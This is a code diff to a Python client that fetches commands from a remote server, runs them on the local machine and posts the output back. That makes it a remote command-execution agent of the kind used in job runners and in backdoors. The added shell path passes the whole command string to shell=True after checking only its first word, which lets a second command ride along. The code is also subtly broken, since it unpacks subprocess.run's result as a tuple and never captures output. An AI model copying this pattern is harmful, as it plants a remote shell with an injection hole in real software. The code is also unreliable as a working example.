@@ -34,13 +34,41 @@ def web_comm_send():
 
 
 def shell_command(com: str):
+    if not com:
+        return True
     d = com.split(maxsplit=2)
     if d[0] == 'cd':
-        os.chdir(d[1])
-        return True
+        if len(d) > 1:
+            os.chdir(d[1])
+            requests.post(urljoin(url_base, "result"), json={
+                "result": "OK"
+            }).json()
+            return True
+    if d[0] in {'ls', 'echo', 'cd', 'df', 'du'}:
+        sout, err = subprocess.run(com, shell=True, text=True)
+        requests.post(urljoin(url_base, "result"), json={
+            "result": sout + err
+        }).json()
     if d[0] == 'quit':
         raise KeyboardInterrupt
     return False
+
+
+def lex(com: str):
+    s = []
+    stage = []
+    quote_on = False
+    for c in com:
+        if c == ' ' and not quote_on:
+            if stage:
+                s.append(''.join(stage)); stage = []
+        elif c == '"':
+            quote_on = not quote_on
+        else:
+            stage.append(c)
+    if stage:
+        s.append(''.join(stage))
+    return s
 
 
 def work():
@@ -55,12 +83,12 @@ def work():
             stop_web_comm = False
             cmd = requests.get(urljoin(url_base, "get_cmd")).json()
             cmdid, cmdexec = cmd['uuid'], cmd['exec']
-            if shell_command(cmdexec):
-                continue
             try:
+                if shell_command(cmdexec):
+                    continue
                 fil = open("tmp.log", "w", 1)
                 proc = subprocess.Popen(
-                    cmdexec, shell=False, universal_newlines=True, bufsize=0,
+                    lex(cmdexec), shell=False, universal_newlines=True, bufsize=0,
                     stdin=subprocess.PIPE, stdout=fil, stderr=fil
                 )
                 comm = (
